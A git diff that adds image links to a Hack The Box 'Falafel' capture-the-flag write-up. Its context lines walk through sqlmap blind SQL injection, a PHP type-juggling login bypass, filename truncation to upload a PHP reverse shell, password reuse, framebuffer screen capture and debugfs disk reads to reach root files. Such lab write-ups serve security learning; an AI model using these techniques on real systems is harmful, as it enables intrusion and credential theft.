@@ -1,5 +1,5 @@
 # Falafel [HTB](https://app.hackthebox.com/machines/124)
-![falafel-01]()
+![falafel-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/falafel-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 falafel.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/ports-02.png)
 
 
 From here I run a version detection scan on these two ports:
@@ -19,7 +19,7 @@ From here I run a version detection scan on these two ports:
 nmap -p 22,80 -sCV falafel.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/nmap-res-03.png)
 
 We have the following:
 
@@ -40,7 +40,7 @@ Let's check this `Falafel Lovers` site.
 
 If we browse towards `http://falafel.htb/` we see the following:
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/site-04.png)
 
 
 The main page mentions that this is a `"beta version"` of the website, and that bugs can be reported to `IT@falafel.htb`. We also see a `Login` button which redirects to `login.php` as well as a `Home` link which redirects back to the main page at `index.php`.
@@ -55,7 +55,7 @@ At this point I decided to run a directory and file scan using:
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://falafel.htb/FUZZ -e .txt,.xml,.html,.php
 ```
 
-![ffuf-05]()
+![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/ffuf-05.png)
 
 
 Most of the files here are common user session handeling scripts, like `login.php`, `logout.php`, `profile.php`, etc. Most of the directories like `js`, `css`, `assets`, etc, are also pretty common. 
@@ -66,7 +66,7 @@ What's unique is that we have an `upload` directory coupled with an `upload.php`
 
 We also have this `cyberlaw.txt` file which reads as such:
 
-![cyberlay-06]()
+![cyberlay-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/cyberlaw-06.png)
 
 
 
@@ -84,7 +84,7 @@ Other then that, the note essentially outlines the exploitation path we need to 
 
 At first, I tried to login in as an innocent user, supplying simple credentials, evaluating the response I get from the server. When authenticating using `admin : admin` I got the following message:
 
-![intended-07]()
+![intended-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/intended-07.png)
 
 
 The message ` Wrong identification : admin ` is fairly ambiguous, but we know from the previous text file that there should be an account with a username of `admin`, so the message must be referring to the password being incorrect. 
@@ -95,7 +95,7 @@ Next, I started playing around with some SQLi authentication bypass payloads. I'
 
 But if we reverse the values, and send the SQLi payload as the username, while supplying an arbitrary value as the password, for example with an input like this: `" or ""*" : admin`, we get a new error message:
 
-![try-again-08]()
+![try-again-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/try-again-08.png)
 
 
 That's interesting. There must be some form of validation on the username field. So I started messing around with different username values. 
@@ -109,7 +109,7 @@ We can conclude from this that the application first validates the supplied user
 
 Then I noticed another interesting thing. If we send a payloads that contain certain SQLi commands like the `UNION`, `SELECT`, `SLEEP`, etc, as the username value, we get a new error message:
 
-![detected-09]()
+![detected-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/detected-09.png)
 
 
 The message says `Hacking Attempt Detected!`. So there must be some form of user input validation on the sever side. 
@@ -137,7 +137,7 @@ Let's try `sqlmap`
 
 I start by making a login request with arbitrary credentials and save it to a file:
 
-![copy-file-10]()
+![copy-file-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/copy-file-10.png)
 
 
 Then I run `sqlmap` on the saved request as such:
@@ -167,7 +167,7 @@ We can configure this logic into `sqlmap` using the `--string` swtich as such:
 sqlmap -r login.req --batch -p "username" --string "Wrong"
 ```
 
-![sqlmap-11]()
+![sqlmap-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/sqlmap-11.png)
 
 
 We got a couple of blind SQLi payloads which seem to work! 
@@ -179,7 +179,7 @@ From here we need to enumerate the databases on the target. We can do that by ad
 sqlmap -r login.req --batch -p "username" --string "Wrong" --dbs
 ```
 
-![dbs-12]()
+![dbs-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/dbs-12.png)
 
 
 We have two databases of `information_schema` and `falafel`. let's dump out the tabels from the `falafel` database using:
@@ -188,7 +188,7 @@ We have two databases of `information_schema` and `falafel`. let's dump out the 
 sqlmap -r login.req --batch -p "username" --string "Wrong" --tables
 ```
 
-![tables-13]()
+![tables-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/tables-13.png)
 
 
 The `falafel` database has one table called `users`, let's dump it out:
@@ -197,7 +197,7 @@ The `falafel` database has one table called `users`, let's dump it out:
 sqlmap -r login.req --batch -p "username" --string "Wrong" -D "falafel" -T "users" --dump
 ```
 
-![dump-14]()
+![dump-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/dump-14.png)
 
 
 
@@ -206,7 +206,7 @@ We can see the password hashes for `admin` & `chris`. I tried to crack the `admi
 
 However, `chris`'s password was cracked by `sqlmap` to `juggling`, lets login:
 
-![login-15]()
+![login-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/login-15.png)
 
 
 ### Chris Access
@@ -226,7 +226,7 @@ If we search for the term `PHP-Jungling` online we can find [this great](https:/
 
 The cheet-sheet page also gives a few different payloads we can use againts different types of hashes. I endded up using `admin : 0e1137126905` to login:
 
-![admin-login-16]()
+![admin-login-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/admin-login-16.png)
 
 
 ## File Upload 
@@ -255,7 +255,7 @@ And I give my server's URL to the application to fetch the image.
 
 The application did connect to my server to retrieve the file. But the more interesting thing is the output in the application:
 
-![output-17]()
+![output-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/output-17.png)
 
 
 I see a real possibility for a command injection here. 
@@ -301,12 +301,12 @@ First we need to understand what is the OS file size limits, I start with the ma
 mv empty.png `python -c "print('A' * 251)"`.png
 ```
 
-![name-18]()
+![name-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/namp-18.png)
 
 
 If we send the application to fetch this file we get the following:
 
-![shorten-19]()
+![shorten-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/shorten-19.png)
 
 
 We did manage to break the filename limit. Now it's a matter of finding the right offset in which we can send a file ending with `<A's>.php.png` and have it shortened to `<A's>.php`. 
@@ -323,7 +323,7 @@ mv rshell.php `python -c "print('A'*234)"`.php.png
 
 I make sure I update my local listener settings for the reverse shell in the PHP script, and I upload it to the application:
 
-![uploaded-21]()
+![uploaded-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/uploaded-21.png)
 
 
 This was a success, as the `Saving to:` argument endded in `.php`.
@@ -341,7 +341,7 @@ And open the path to our reverse shell at:
 http://falafel.htb//uploads/0103-1545_4763f588cab25f74/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
 ```
 
-![shell-22]()
+![shell-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/shell-22.png)
 
 
 ## Privilege Escalation
@@ -356,12 +356,12 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Next, I try to list any `sudo` permissions but I get prompted for credentials. Instead I start looking around the filesystem. I start with the `/var/www/html` directory because I know we have access to all the files there as the `www-data` service account:
 
 
-![var-www-23]()
+![var-www-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/var-www-23.png)
 
 
 We know we have a MySQL database somewhere on this system, therefore this `connection.php` script is probably used to connect to the database:
 
-![connection-24]()
+![connection-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/connection-24.png)
 
 
 We can see that the credentials to the database are `moshe : falafelIsReallyTasty`. 
@@ -369,12 +369,12 @@ We can see that the credentials to the database are `moshe : falafelIsReallyTast
 
 If we list the contents of the `/home` directory, we will find that `moshe` is an active user on the system:
 
-![home-25]()
+![home-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/home-25.png)
 
 
 Therefore I try to reuse the password to login via SSH as `moshe` and it worked:
 
-![ssh-26]()
+![ssh-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/ssh-26.png)
 
 
 ### Moshe
@@ -390,7 +390,7 @@ Based on the output from the `id` command we can see that `moshe` is a part of t
 
 If we run the `w` command, we can see that `yossi` is also connected:
 
-![w-27]()
+![w-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/w-27.png)
 
 
 If we check for any frame-buffer devices on the system, we will find one such device:
@@ -399,7 +399,7 @@ If we check for any frame-buffer devices on the system, we will find one such de
 ls /dev/ | grep fb*
 ```
 
-![device-28]()
+![device-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/device-28.png)
 
 
 This is probably where `yossi`'s screen is being rendered from. 
@@ -423,7 +423,7 @@ The next step is to find the resolution that the screen is using. This we can fi
 cat /sys/class/graphics/fb0/virtual_size
 ```
 
-![resolution-29]()
+![resolution-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/resolution-29.png)
 
 
 Now we can use the following perl script to turn this frame into an image:
@@ -462,7 +462,7 @@ This should make a `screen.png` file in your working directory.
 
 The image looks like this:
 
-![image-30]()
+![image-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/image-30.png)
 
 
 It looks like `yossi` tried to run `passwd` in order to change he's password. But he made a mistake supplying the password while invoking `passwd` when he ran it the first time. So he's passwrod should be `MoshePlzStopHackingMe!`
@@ -470,7 +470,7 @@ It looks like `yossi` tried to run `passwd` in order to change he's password. Bu
 
 If we supply this password to `su yossi -` we get a shell as `yossi`:
 
-![yossi-31]()
+![yossi-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/yossi-31.png)
 
 
 ### Yossi
@@ -483,7 +483,7 @@ This privilege can be abused to copy the contents of the block device on which t
 
 First, we need to identify the parition layout on the system. We can do this by running `lsblk`:
 
-![lsblk-32]()
+![lsblk-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/lsblk-32.png)
 
 
 The root filesystem is mounted on the `/dev/sda1` partition. I tried to copy this over to my attack machine and mount it there but I had issues pulling this off. 
@@ -495,7 +495,7 @@ Instead we can use something like `debugfs` to traverse the device and get the r
 debugfs /dev/sda1
 ```
 
-![root-33]()
+![root-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Falafel/img/root-33.png)
 
 
 We can also read the contents of the `/etc/shadow` file from the `debugfs` shell, but I wasn't able to crack the root hash. 
